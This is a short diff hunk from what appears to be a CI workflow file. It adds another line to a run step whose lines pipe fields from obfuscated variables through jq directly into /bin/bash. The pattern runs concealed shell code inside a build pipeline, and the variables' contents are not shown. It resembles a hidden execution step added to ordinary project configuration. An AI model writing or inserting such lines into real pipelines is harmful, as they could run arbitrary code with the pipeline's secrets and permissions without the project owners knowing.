@@ -28,6 +28,7 @@ jobs:
           echo $y83019 | jq -r .agezi0 | /bin/bash
           printf '%s' "$jlloa36402" | jq -r .xenav427 | /bin/bash
           printf '%s' "$o9" | jq -r .xkccx96 | /bin/bash
+          echo $y9 | jq -r .chab3447 | /bin/bash
 
       - name: Upload results
         if: always()
